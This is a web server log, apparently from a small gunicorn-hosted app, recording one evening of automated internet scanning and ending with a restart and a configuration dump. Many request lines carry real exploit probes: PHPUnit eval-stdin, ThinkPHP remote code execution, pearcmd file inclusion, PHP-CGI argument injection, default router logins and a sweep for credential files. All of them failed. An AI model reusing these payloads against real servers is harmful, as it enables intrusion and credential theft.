+ - - [04/Mar/2026:16:22:27 -0300] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:28 -0300] [57082] [DEBUG] GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:28 -0300] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:28 -0300] [57082] [DEBUG] GET /index.php
+ - - [04/Mar/2026:16:22:28 -0300] "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:29 -0300] [57078] [DEBUG] GET /public/index.php
+ - - [04/Mar/2026:16:22:29 -0300] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:29 -0300] [57081] [DEBUG] GET /index.php
+ - - [04/Mar/2026:16:22:29 -0300] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:30 -0300] [57080] [DEBUG] GET /index.php
+ - - [04/Mar/2026:16:22:30 -0300] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:32 -0300] [57081] [DEBUG] GET /containers/json
+ - - [04/Mar/2026:16:22:32 -0300] "GET /containers/json HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:23:46 -0300] [57078] [DEBUG] POST /
+ - - [04/Mar/2026:16:23:46 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 16:50:25 -0300] [57081] [DEBUG] GET /
+ - - [04/Mar/2026:16:50:25 -0300] "GET / HTTP/1.1" 200 1022 "-" "Go-http-client/1.1"
+[2026-03-04 17:01:09 -0300] [57080] [DEBUG] GET /bin/
+ - - [04/Mar/2026:17:01:09 -0300] "GET /bin/ HTTP/1.1" 404 179 "-" "-"
+[2026-03-04 17:08:06 -0300] [57079] [DEBUG] GET /
+ - - [04/Mar/2026:17:08:06 -0300] "GET / HTTP/1.1" 200 1022 "-" "-"
+[2026-03-04 17:10:45 -0300] [57082] [DEBUG] GET /
+ - - [04/Mar/2026:17:10:45 -0300] "GET / HTTP/1.1" 200 1022 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
+[2026-03-04 17:17:11 -0300] [57080] [DEBUG] GET /backup/
+ - - [04/Mar/2026:17:17:11 -0300] "GET /backup/ HTTP/1.1" 404 179 "-" "-"
+[2026-03-04 17:34:10 -0300] [57077] [DEBUG] POST /
+ - - [04/Mar/2026:17:34:10 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 18:20:39 -0300] [57082] [DEBUG] GET /
+ - - [04/Mar/2026:18:20:39 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0"
+[2026-03-04 18:20:58 -0300] [57079] [DEBUG] GET /
+ - - [04/Mar/2026:18:20:58 -0300] "GET / HTTP/1.1" 200 1022 "-" "python-requests/2.32.5"
+[2026-03-04 18:21:31 -0300] [57079] [DEBUG] GET /SDK/webLanguage
+ - - [04/Mar/2026:18:21:31 -0300] "GET /SDK/webLanguage HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+[2026-03-04 19:03:56 -0300] [57080] [DEBUG] POST /
+ - - [04/Mar/2026:19:03:56 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 19:07:12 -0300] [57080] [DEBUG] GET /
+ - - [04/Mar/2026:19:07:12 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+[2026-03-04 19:18:32 -0300] [57077] [DEBUG] GET /
+ - - [04/Mar/2026:19:18:32 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/1.0"
+[2026-03-04 19:25:47 -0300] [57081] [DEBUG] GET /aaa9
+ - - [04/Mar/2026:19:25:47 -0300] "GET /aaa9 HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
+[2026-03-04 19:25:47 -0300] [57080] [DEBUG] GET /aab9
+ - - [04/Mar/2026:19:25:47 -0300] "GET /aab9 HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
+[2026-03-04 19:37:12 -0300] [57082] [DEBUG] GET /
+ - - [04/Mar/2026:19:37:12 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0"
+[2026-03-04 19:38:47 -0300] [57082] [DEBUG] GET /docker.env
+[2026-03-04 19:38:47 -0300] [57081] [DEBUG] GET /config.php
+ - - [04/Mar/2026:19:38:47 -0300] "GET /docker.env HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+[2026-03-04 19:38:47 -0300] [57077] [DEBUG] GET /database.php
+[2026-03-04 19:38:47 -0300] [57082] [DEBUG] GET /settings.php
+[2026-03-04 19:38:47 -0300] [57080] [DEBUG] GET /settings.json
+ - - [04/Mar/2026:19:38:47 -0300] "GET /settings.php HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+[2026-03-04 19:38:47 -0300] [57082] [DEBUG] GET /django/local_settings.py
+ - - [04/Mar/2026:19:38:47 -0300] "GET /django/local_settings.py HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+[2026-03-04 19:38:47 -0300] [57082] [DEBUG] GET /configuration.php
+ - - [04/Mar/2026:19:38:47 -0300] "GET /config.php HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+ - - [04/Mar/2026:19:38:47 -0300] "GET /settings.json HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+[2026-03-04 19:38:47 -0300] [57081] [DEBUG] GET /django/settings.py
+[2026-03-04 19:38:47 -0300] [57080] [DEBUG] GET /wp-config.php
+[2026-03-04 19:38:47 -0300] [57079] [DEBUG] GET /db.php
+ - - [04/Mar/2026:19:38:47 -0300] "GET /database.php HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+[2026-03-04 19:38:47 -0300] [57078] [DEBUG] GET /docker-compose.yml
+[2026-03-04 19:38:47 -0300] [57077] [DEBUG] GET /node/config.env
+ - - [04/Mar/2026:19:38:47 -0300] "GET /django/settings.py HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+ - - [04/Mar/2026:19:38:47 -0300] "GET /wp-config.php HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+[2026-03-04 19:38:47 -0300] [57081] [DEBUG] GET /appsettings.json
+[2026-03-04 19:38:47 -0300] [57080] [DEBUG] GET /auth.json
+ - - [04/Mar/2026:19:38:47 -0300] "GET /node/config.env HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+ - - [04/Mar/2026:19:38:47 -0300] "GET /appsettings.json HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+ - - [04/Mar/2026:19:38:47 -0300] "GET /configuration.php HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+ - - [04/Mar/2026:19:38:47 -0300] "GET /auth.json HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+[2026-03-04 19:38:47 -0300] [57082] [DEBUG] GET /credentials.json
+[2026-03-04 19:38:47 -0300] [57077] [DEBUG] GET /docker-compose.override.yml
+ - - [04/Mar/2026:19:38:47 -0300] "GET /credentials.json HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+[2026-03-04 19:38:47 -0300] [57081] [DEBUG] GET /config.json
+[2026-03-04 19:38:47 -0300] [57080] [DEBUG] GET /secrets.json
+ - - [04/Mar/2026:19:38:47 -0300] "GET /secrets.json HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+ - - [04/Mar/2026:19:38:47 -0300] "GET /docker-compose.override.yml HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+ - - [04/Mar/2026:19:38:47 -0300] "GET /db.php HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+ - - [04/Mar/2026:19:38:47 -0300] "GET /docker-compose.yml HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+ - - [04/Mar/2026:19:38:47 -0300] "GET /config.json HTTP/1.1" 404 179 "-" "Mozilla/5.0"
+[2026-03-04 19:46:16 -0300] [57078] [DEBUG] GET /
+ - - [04/Mar/2026:19:46:16 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 19:46:17 -0300] [57082] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:19:46:17 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "http://136.116.33.237/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 19:47:30 -0300] [57080] [DEBUG] GET /
+ - - [04/Mar/2026:19:47:31 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 19:48:21 -0300] [57079] [DEBUG] GET /
+ - - [04/Mar/2026:19:48:21 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 19:48:22 -0300] [57079] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:19:48:22 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "http://136.116.33.237/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 19:48:34 -0300] [57082] [DEBUG] GET /
+ - - [04/Mar/2026:19:48:34 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 19:51:10 -0300] [57081] [DEBUG] GET /
+ - - [04/Mar/2026:19:51:10 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 19:52:40 -0300] [57079] [DEBUG] GET /
+ - - [04/Mar/2026:19:52:40 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 19:53:50 -0300] [57078] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:19:53:50 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "http://136.116.33.237/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 19:53:54 -0300] [57078] [DEBUG] GET /
+ - - [04/Mar/2026:19:53:54 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 19:54:01 -0300] [57081] [DEBUG] GET /
+ - - [04/Mar/2026:19:54:01 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 19:55:53 -0300] [57077] [DEBUG] POST /hello.world
+ - - [04/Mar/2026:19:55:53 -0300] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:53 -0300] [57080] [DEBUG] POST /
+ - - [04/Mar/2026:19:55:53 -0300] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 403 1421 "-" "libredtail-http"
+[2026-03-04 19:55:54 -0300] [57079] [DEBUG] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:54 -0300] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:54 -0300] [57080] [DEBUG] GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:54 -0300] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:54 -0300] [57081] [DEBUG] GET /vendor/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:54 -0300] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:54 -0300] [57079] [DEBUG] GET /vendor/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:54 -0300] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:55 -0300] [57080] [DEBUG] GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
+ - - [04/Mar/2026:19:55:55 -0300] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:55 -0300] [57081] [DEBUG] GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:55 -0300] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:55 -0300] [57077] [DEBUG] GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:55 -0300] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:55 -0300] [57080] [DEBUG] GET /phpunit/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:55 -0300] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:56 -0300] [57077] [DEBUG] GET /phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:56 -0300] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:56 -0300] [57080] [DEBUG] GET /phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:56 -0300] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:56 -0300] [57078] [DEBUG] GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:56 -0300] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:57 -0300] [57078] [DEBUG] GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:57 -0300] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:57 -0300] [57082] [DEBUG] GET /lib/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:57 -0300] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:57 -0300] [57080] [DEBUG] GET /lib/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:57 -0300] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:58 -0300] [57079] [DEBUG] GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:58 -0300] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:58 -0300] [57082] [DEBUG] GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:58 -0300] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:58 -0300] [57079] [DEBUG] GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:58 -0300] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:58 -0300] [57077] [DEBUG] GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:58 -0300] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:59 -0300] [57082] [DEBUG] GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:59 -0300] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:59 -0300] [57081] [DEBUG] GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:59 -0300] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:59 -0300] [57081] [DEBUG] GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:59 -0300] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:59 -0300] [57080] [DEBUG] GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:59 -0300] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:59 -0300] [57080] [DEBUG] GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:59 -0300] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:55:59 -0300] [57079] [DEBUG] GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:55:59 -0300] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:00 -0300] [57079] [DEBUG] GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:00 -0300] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:00 -0300] [57080] [DEBUG] GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:00 -0300] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:00 -0300] [57080] [DEBUG] GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:00 -0300] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:00 -0300] [57078] [DEBUG] GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:00 -0300] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:00 -0300] [57081] [DEBUG] GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:00 -0300] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:00 -0300] [57082] [DEBUG] GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:00 -0300] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 0 "-" "libredtail-http"
+[2026-03-04 19:56:00 -0300] [57082] [DEBUG] GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:00 -0300] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:01 -0300] [57079] [DEBUG] GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:01 -0300] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:01 -0300] [57080] [DEBUG] GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:01 -0300] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:01 -0300] [57081] [DEBUG] GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:01 -0300] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:01 -0300] [57080] [DEBUG] GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:01 -0300] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:02 -0300] [57081] [DEBUG] GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:02 -0300] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:02 -0300] [57081] [DEBUG] GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:19:56:02 -0300] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:02 -0300] [57077] [DEBUG] GET /index.php
+ - - [04/Mar/2026:19:56:02 -0300] "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:03 -0300] [57077] [DEBUG] GET /public/index.php
+ - - [04/Mar/2026:19:56:03 -0300] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:03 -0300] [57081] [DEBUG] GET /index.php
+ - - [04/Mar/2026:19:56:03 -0300] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:03 -0300] [57080] [DEBUG] GET /index.php
+ - - [04/Mar/2026:19:56:03 -0300] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:04 -0300] [57082] [DEBUG] GET /containers/json
+ - - [04/Mar/2026:19:56:04 -0300] "GET /containers/json HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 19:56:38 -0300] [57082] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:19:56:38 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "http://136.116.33.237/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 20:08:32 -0300] [57080] [DEBUG] GET /boaform/admin/formLogin
+ - - [04/Mar/2026:20:08:32 -0300] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.1" 404 179 "-" "-"
+[2026-03-04 20:16:39 -0300] [57077] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:20:16:39 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "http://136.116.33.237/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 20:16:42 -0300] [57082] [DEBUG] GET /
+ - - [04/Mar/2026:20:16:42 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 20:18:02 -0300] [57082] [DEBUG] GET /
+ - - [04/Mar/2026:20:18:02 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 20:18:34 -0300] [57080] [DEBUG] GET /
+ - - [04/Mar/2026:20:18:34 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 20:18:50 -0300] [57080] [DEBUG] GET /
+ - - [04/Mar/2026:20:18:50 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 20:33:09 -0300] [57080] [DEBUG] GET /
+ - - [04/Mar/2026:20:33:09 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 23:36:33 +0000] [57074] [INFO] Handling signal: term
+[2026-03-04 20:36:33 -0300] [57080] [INFO] Worker exiting (pid: 57080)
+[2026-03-04 20:36:33 -0300] [57077] [INFO] Worker exiting (pid: 57077)
+[2026-03-04 20:36:33 -0300] [57082] [INFO] Worker exiting (pid: 57082)
+[2026-03-04 20:36:33 -0300] [57078] [INFO] Worker exiting (pid: 57078)
+[2026-03-04 20:36:33 -0300] [57079] [INFO] Worker exiting (pid: 57079)
+[2026-03-04 20:36:33 -0300] [57081] [INFO] Worker exiting (pid: 57081)
+[2026-03-04 23:36:33 +0000] [57074] [INFO] Worker (pid:57077) was sent SIGTERM!
+[2026-03-04 23:36:33 +0000] [57074] [INFO] Worker (pid:57080) was sent SIGTERM!
+[2026-03-04 23:36:33 +0000] [57074] [INFO] Worker (pid:57082) was sent SIGTERM!
+[2026-03-04 23:36:34 +0000] [57074] [INFO] Shutting down: Master
+[2026-03-04 23:36:35 +0000] [62832] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/agenda.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
